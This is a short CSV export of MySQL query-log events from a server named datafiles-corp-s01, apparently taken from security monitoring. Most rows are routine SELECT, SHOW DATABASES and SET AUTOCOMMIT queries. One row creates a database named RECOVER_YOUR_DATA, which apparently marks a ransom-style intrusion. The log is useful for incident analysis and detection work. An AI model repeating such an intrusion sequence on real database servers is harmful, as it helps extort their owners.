TimeGenerated,DeviceName,ActionType,Query,RawData
"Sep 2, 2026 8:08:19 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-03T00:08:19.718686Z   103 Query SELECT @@max_allowed_packet
"Sep 2, 2026 7:57:59 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T23:57:59.169920Z    98 Query SELECT @@max_allowed_packet
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T23:24:35.710916Z    93 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:35.617474Z    93 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:35 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:35.241692Z    92 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:34.396887Z    90 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T23:24:34.001098Z    89 Query SHOW DATABASES
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T23:24:34.868636Z    91 Query SHOW DATABASES
"Sep 2, 2026 7:24:34 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:34.774574Z    91 Query SET AUTOCOMMIT=0
"Sep 2, 2026 7:24:33 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T23:24:33.903601Z    89 Query SET AUTOCOMMIT=0
"Sep 2, 2026 6:40:55 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T22:40:55.236669Z    88 Query SELECT @@max_allowed_packet
"Sep 2, 2026 5:22:40 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T21:22:40.648855Z    80 Query SELECT @@max_allowed_packet
"Sep 2, 2026 4:04:25 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T20:04:25.103739Z    75 Query SELECT @@max_allowed_packet
"Sep 2, 2026 4:04:18 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T20:04:18.060274Z    70 Query SELECT @@max_allowed_packet
"Sep 2, 2026 2:46:14 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T18:46:14.075039Z    65 Query SELECT @@max_allowed_packet
